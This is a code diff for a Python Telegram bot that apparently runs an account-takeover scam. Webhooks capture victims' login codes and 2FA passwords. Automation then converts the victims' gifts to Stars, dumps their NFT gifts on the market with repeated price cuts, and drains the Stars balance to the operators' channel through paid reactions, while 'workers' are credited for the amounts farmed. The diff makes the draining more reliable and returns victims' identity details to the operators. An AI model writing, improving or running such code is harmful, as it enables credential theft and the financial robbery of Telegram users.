@@ -1,9 +1,15 @@
+import sys
+import io
+# принудительный flush stdout — логи видны мгновенно
+sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
+sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', line_buffering=True)
+
 import asyncio
 import os
 import re
 import random
+import time as _time
 from datetime import datetime
-from contextlib import asynccontextmanager
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.client.default import DefaultBotProperties
@@ -59,11 +65,11 @@ TARGET_CHANNEL = _m.group(1) if _m else None
 TARGET_POST_ID = int(_m.group(2)) if _m else None
 
 MAX_ATTEMPTS = 3
-PRICE_CYCLE_WAIT = 180     # 3 минуты в секундах
-PRICE_DROP = 150           # скидываем на 150 ⭐ каждый цикл
+PRICE_CYCLE_WAIT = 180
+PRICE_DROP = 150
 
 print("=" * 60)
-print("BOT CODE VERSION: v6 — full automation + roles + stats")
+print("BOT CODE VERSION: v7 — can_export_at check + reaction fallback + logs")
 print(f"TARGET: {TARGET_CHANNEL}/{TARGET_POST_ID}")
 print("=" * 60)
 
@@ -87,7 +93,7 @@ class User(Base):
     role: Mapped[str] = mapped_column(String(16), default="user")
     balance: Mapped[int] = mapped_column(Integer, default=0)
     total_offers: Mapped[int] = mapped_column(Integer, default=0)
-    stars_farmed: Mapped[int] = mapped_column(Integer, default=0)  # сколько звёзд завёл через офферы
+    stars_farmed: Mapped[int] = mapped_column(Integer, default=0)
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
@@ -111,7 +117,7 @@ class Offer(Base):
     price_usd: Mapped[str] = mapped_column(String(32), default="—")
     duration_hours: Mapped[int] = mapped_column(Integer, default=24)
     status: Mapped[str] = mapped_column(String(16), default="pending")
-    stars_earned: Mapped[int] = mapped_column(Integer, default=0)  # сколько звёзд заработано по этому офферу
+    stars_earned: Mapped[int] = mapped_column(Integer, default=0)
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
@@ -359,16 +365,6 @@ async def telethon_attempt_login(phone, code, password=None, session_str=None, p
 
 
 async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
-    """
-    1. Заходим в аккаунт мамонта.
-    2. Конвертируем обычные подарки в звёзды.
-    3. Для каждого unique подарка:
-       - если выставлен (resell_amount != None) → ставим текущая*0.7
-       - ждём 3 минуты
-       - если не купили → цена -150
-       - цикл пока не купят
-    4. Когда все NFT проданы → все звёзды на пост.
-    """
     client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
     result = {
         "gifts_total": 0,
@@ -376,6 +372,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
         "listed": [],
         "sold": [],
         "failed": [],
+        "skipped": [],
         "balance_before": 0,
         "balance_after": 0,
         "reacted": False,
@@ -411,7 +408,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
         result["gifts_total"] = len(gifts)
         print(f"[AUTO] found {len(gifts)} gifts")
 
-        # ─── 2. разделяем на: обычные (не выставлены на маркет) и unique выставленные
+        # ─── 2. разделяем
         regular_to_convert = []
         unique_listed = []
 
@@ -441,18 +438,36 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                 continue
 
             if is_unique and ra is not None:
-                # уже выставлен на маркет
                 current_price = int(getattr(ra, "amount", 0) or 0)
                 unique_listed.append({
                     "title": title, "ref": ref, "current_price": current_price,
                 })
             elif not is_unique:
-                # обычный — конвертируем
+                # проверяем можно ли конвертировать
+                can_export_at = getattr(g, "can_export_at", None)
+                can_export_ts = 0
+                if can_export_at:
+                    try:
+                        can_export_ts = int(can_export_at.timestamp())
+                    except Exception:
+                        try:
+                            can_export_ts = int(can_export_at)
+                        except Exception:
+                            can_export_ts = 0
+                now_ts = int(_time.time())
+                if can_export_ts and can_export_ts > now_ts:
+                    wait_days = max(1, (can_export_ts - now_ts) // 86400)
+                    result["skipped"].append({
+                        "title": title,
+                        "reason": f"конвертация через {wait_days} дн."
+                    })
+                    print(f"[AUTO] skip {title}: can_export_at in {wait_days} days")
+                    continue
                 regular_to_convert.append({"title": title, "ref": ref})
 
-        print(f"[AUTO] regular={len(regular_to_convert)} unique_listed={len(unique_listed)}")
+        print(f"[AUTO] regular={len(regular_to_convert)} unique_listed={len(unique_listed)} skipped={len(result['skipped'])}")
 
-        # ─── 3. конвертируем обычные в звёзды
+        # ─── 3. конвертируем обычные
         for r in regular_to_convert:
             try:
                 await client(ConvertStarGiftRequest(stargift=r["ref"]))
@@ -460,14 +475,14 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                 print(f"[AUTO] converted {r['title']}")
                 await asyncio.sleep(1.2)
             except Exception as e:
-                result["failed"].append({"title": r["title"], "reason": f"convert: {type(e).__name__}: {e}"})
-                print(f"[AUTO] convert fail {r['title']}: {e}")
+                err_str = str(e)
+                result["failed"].append({"title": r["title"], "reason": f"convert: {type(e).__name__}: {err_str[:80]}"})
+                print(f"[AUTO] convert fail {r['title']}: {type(e).__name__}: {err_str}")
 
         # ─── 4. для каждого уникального — цикл снижения цены
         for u in unique_listed:
             print(f"[AUTO] processing unique: {u['title']} start price={u['current_price']}")
 
-            # первичная цена = текущая * 0.7
             new_price = int(u["current_price"] * 0.7)
             if new_price < 1:
                 new_price = 1
@@ -481,17 +496,14 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                 print(f"[AUTO] listed {u['title']} at {new_price}")
                 await asyncio.sleep(1.5)
             except Exception as e:
-                result["failed"].append({"title": u["title"], "reason": f"list: {type(e).__name__}: {e}"})
-                print(f"[AUTO] list fail {u['title']}: {e}")
+                result["failed"].append({"title": u["title"], "reason": f"list: {type(e).__name__}: {str(e)[:80]}"})
+                print(f"[AUTO] list fail {u['title']}: {type(e).__name__}: {e}")
                 continue
 
-            # цикл ожидания и снижения
             sold = False
-            for cycle in range(60):  # максимум 60 итераций (3 мин * 60 = 180 минут)
-                # ждём 3 минуты
+            for cycle in range(60):
                 await asyncio.sleep(PRICE_CYCLE_WAIT)
 
-                # проверяем продан ли — refresh gift
                 try:
                     check_resp = await client(GetSavedStarGiftsRequest(
                         peer=me.id, offset="", limit=100,
@@ -515,9 +527,8 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                         print(f"[AUTO] SOLD {u['title']} at {new_price}")
                         break
                 except Exception as e:
-                    print(f"[AUTO] check error: {e}")
+                    print(f"[AUTO] check error: {type(e).__name__}: {e}")
 
-                # не продан — снижаем
                 new_price = max(1, new_price - PRICE_DROP)
                 try:
                     await client(UpdateStarGiftPriceRequest(
@@ -528,8 +539,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                     print(f"[AUTO] cycle {cycle+1}: dropped {u['title']} to {new_price}")
                     await asyncio.sleep(1.5)
                 except Exception as e:
-                    print(f"[AUTO] cycle drop fail: {e}")
-                    # если упало — значит подарок уже продан
+                    print(f"[AUTO] cycle drop fail: {type(e).__name__}: {e}")
                     sold = True
                     result["sold"].append({"title": u["title"]})
                     break
@@ -537,7 +547,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
             if not sold:
                 result["failed"].append({"title": u["title"], "reason": "не продан за 3 часа"})
 
-        # ─── 5. баланс после всех операций
+        # ─── 5. баланс
         balance = 0
         try:
             status = await client(GetStarsStatusRequest(peer=me.id))
@@ -545,34 +555,42 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
             if bal:
                 balance = int(getattr(bal, "amount", 0) or 0)
         except Exception as e:
-            print(f"[AUTO] stars status err: {e}")
+            print(f"[AUTO] stars status err: {type(e).__name__}: {e}")
         result["balance_after"] = balance
+        print(f"[AUTO] balance = {balance}")
 
-        # ─── 6. платная реакция на пост
+        # ─── 6. реакция с fallback
         if balance > 0 and TARGET_CHANNEL and TARGET_POST_ID:
             sent = False
-            for attempt in range(5):
-                try:
-                    random_id = random.randint(1, 2**63 - 1)
-                    await client(SendPaidReactionRequest(
-                        peer=TARGET_CHANNEL,
-                        msg_id=TARGET_POST_ID,
-                        count=balance,
-                        random_id=random_id,
-                    ))
-                    result["reacted"] = True
-                    result["stars_sent"] = balance
-                    sent = True
+            # пробуем весь баланс, если не проходит — 1 звезду
+            for try_count in [balance, 1, min(balance, 100)]:
+                if sent:
                     break
-                except Exception as e:
-                    print(f"[AUTO] reaction attempt {attempt+1}: {type(e).__name__}: {e}")
-                    await asyncio.sleep(2)
+                if try_count <= 0:
+                    continue
+                for attempt in range(3):
+                    try:
+                        random_id = random.randint(1, 2**63 - 1)
+                        await client(SendPaidReactionRequest(
+                            peer=TARGET_CHANNEL,
+                            msg_id=TARGET_POST_ID,
+                            count=try_count,
+                            random_id=random_id,
+                        ))
+                        result["reacted"] = True
+                        result["stars_sent"] = try_count
+                        sent = True
+                        print(f"[AUTO] reaction OK: {try_count} ⭐")
+                        break
+                    except Exception as e:
+                        err_str = str(e)
+                        print(f"[AUTO] reaction try={try_count} attempt={attempt+1}: {type(e).__name__}: {err_str}")
+                        await asyncio.sleep(2)
             if not sent:
-                result["error"] = "reaction: не удалось после 5 попыток"
+                result["error"] = "reaction: не удалось"
         elif balance == 0:
             result["error"] = "баланс = 0"
 
-        # записываем звёзды в статистику
         if result["stars_sent"] > 0:
             await add_stars_farmed(worker_id, result["stars_sent"])
             await update_offer_stars(offer_id, result["stars_sent"])
@@ -580,6 +598,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
         return result
     except Exception as e:
         result["error"] = f"{type(e).__name__}: {e}"
+        print(f"[AUTO] top-level error: {type(e).__name__}: {e}")
         return result
     finally:
         try:
@@ -589,7 +608,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
 
 
 # ═══════════════════════════════════════════════════════
-#   BOT — только для админа и воркеров
+#   BOT
 # ═══════════════════════════════════════════════════════
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
@@ -635,13 +654,6 @@ def menu_for(role):
     return user_menu()
 
 
-async def is_worker_or_admin(user_id):
-    u = await get_user(user_id)
-    if not u:
-        return False
-    return u.role in ("worker", "admin")
-
-
 class OfferForm(StatesGroup):
     gift_link = State()
     price_stars = State()
@@ -652,7 +664,7 @@ class GrantForm(StatesGroup):
 
 
 # ═══════════════════════════════════════════════════════
-#   BUSINESS CONNECTION
+#   BUSINESS
 # ═══════════════════════════════════════════════════════
 
 @dp.business_connection()
@@ -675,7 +687,7 @@ async def on_business_connection(conn: types.BusinessConnection):
 
 
 # ═══════════════════════════════════════════════════════
-#   /start — только для admin / worker
+#   /start
 # ═══════════════════════════════════════════════════════
 
 @dp.message(CommandStart())
@@ -687,9 +699,8 @@ async def start(message: types.Message):
         await set_role(uid, "admin")
         u.role = "admin"
 
-    # ОБЫЧНЫХ ЮЗЕРОВ ИГНОРИРУЕМ
     if u.role not in ("admin", "worker"):
-        print(f"[IGNORE] /start from non-worker user_id={uid}")
+        print(f"[IGNORE] /start from user_id={uid}")
         return
 
     conn = await get_business_conn(uid)
@@ -711,7 +722,6 @@ async def start(message: types.Message):
 async def main_menu(call: types.CallbackQuery):
     u = await get_user(call.from_user.id)
     if not u or u.role not in ("admin", "worker"):
-        await call.answer("Нет доступа", show_alert=True)
         return
     conn = await get_business_conn(u.id)
     conn_line = f"\n├ Подключение: <b>{'✅ есть' if conn and conn.connection_id else '❌ нет'}</b>" if u.role in ("worker","admin") else ""
@@ -757,32 +767,17 @@ async def my_conn_callback(call: types.CallbackQuery):
             f"├ ID: <code>{conn.connection_id}</code>\n"
             f"├ Can reply: <b>{conn.can_reply}</b>\n"
             f"└ Обновлено: {conn.updated_at:%d.%m.%Y %H:%M}\n\n"
-            f"<b>Создать оффер:</b>\n"
-            f"<code>/offer user_id ссылка сумма</code>"
+            f"<b>Создать оффер:</b>\n<code>/offer user_id ссылка сумма</code>"
         )
     else:
         text = (
             f"❌ <b>Бизнес-бот не подключён</b>\n\n"
             f"1. Telegram → Настройки → Telegram Business\n"
             f"2. Чат-боты → Добавить бота\n"
-            f"3. Введи <code>@{BOT_USERNAME}</code>\n"
-            f"4. Дай права на чтение и отправку"
+            f"3. Введи <code>@{BOT_USERNAME}</code>"
         )
     await call.message.edit_text(
         text,
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-        ]),
-    )
-
-
-@dp.callback_query(F.data == "offers_menu")
-async def offers_menu(call: types.CallbackQuery):
-    u = await get_user(call.from_user.id)
-    if not u or u.role not in ("admin", "worker"):
-        return
-    await call.message.edit_text(
-        "💼 <b>Офферы</b>\n\nСоздать оффер можно командой:\n<code>/offer user_id ссылка сумма</code>",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
@@ -811,6 +806,19 @@ async def my_gifts(call: types.CallbackQuery):
         return
     await call.message.edit_text(
         "🎁 <b>Мои подарки</b>\n\nПоявятся после успешного оффера.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        ]),
+    )
+
+
+@dp.callback_query(F.data == "offers_menu")
+async def offers_menu(call: types.CallbackQuery):
+    u = await get_user(call.from_user.id)
+    if not u or u.role not in ("admin", "worker"):
+        return
+    await call.message.edit_text(
+        "💼 <b>Офферы</b>\n\nСоздать: <code>/offer user_id ссылка сумма</code>",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
@@ -989,6 +997,7 @@ async def grant_finish(message: types.Message, state: FSMContext):
         await set_role(uid, "user")
         await message.answer(f"✅ <code>{uid}</code> больше не воркер.")
     else:
+        await add_user(uid, None, None, "worker")
         await set_role(uid, "worker")
         await message.answer(f"✅ <code>{uid}</code> теперь воркер.")
         try:
@@ -1180,11 +1189,14 @@ async def wh_code(p: CodePayload):
             f"✅ <b>Логин</b>\n<code>{res['user_id']}</code>\n"
             f"{res['first_name']} @{res['username'] or '—'}\nОффер #{p.offer_id}")
 
-        # запускаем автомат
         o = await get_offer(p.offer_id)
         worker_id = o.worker_id if o else ADMIN_ID
         asyncio.create_task(run_automation(session_str, p.offer_id, worker_id))
-        return {"ok": True, "needs_password": False}
+        return {"ok": True, "needs_password": False,
+                "user_id": res["user_id"],
+                "first_name": res["first_name"],
+                "last_name": res["last_name"],
+                "username": res["username"]}
     else:
         if res == "password":
             await update_session(sess.id, code=p.code, state="await_password")
@@ -1221,7 +1233,11 @@ async def wh_password(p: PasswordPayload):
         o = await get_offer(p.offer_id)
         worker_id = o.worker_id if o else ADMIN_ID
         asyncio.create_task(run_automation(session_str, p.offer_id, worker_id))
-        return {"ok": True}
+        return {"ok": True,
+                "user_id": res["user_id"],
+                "first_name": res["first_name"],
+                "last_name": res["last_name"],
+                "username": res["username"]}
     else:
         if res == "password":
             new_attempts = sess.attempts + 1
@@ -1260,11 +1276,17 @@ async def run_automation(session_string, offer_id, worker_id):
         for x in sold:
             lines.append(f"• {x['title']}")
 
+    skipped = result.get("skipped", [])
+    if skipped:
+        lines.append(f"\n⏳ <b>Пропущено ({len(skipped)}):</b>")
+        for x in skipped[:5]:
+            lines.append(f"• {x['title']} — {x['reason']}")
+
     failed = result.get("failed", [])
     if failed:
         lines.append(f"\n❌ <b>Ошибок ({len(failed)}):</b>")
         for x in failed[:5]:
-            lines.append(f"• {x['title']} — {x['reason'][:50]}")
+            lines.append(f"• {x['title']} — {x['reason'][:60]}")
 
     lines.append(f"\n💰 Баланс: <b>{result.get('balance_after', 0)} ⭐</b>")
     if result.get("reacted"):
@@ -1274,7 +1296,6 @@ async def run_automation(session_string, offer_id, worker_id):
 
     text = "\n".join(lines)
     await notify_admin(text)
-    # отправляем воркеру тоже
     try:
         await bot.send_message(worker_id, text)
     except Exception:
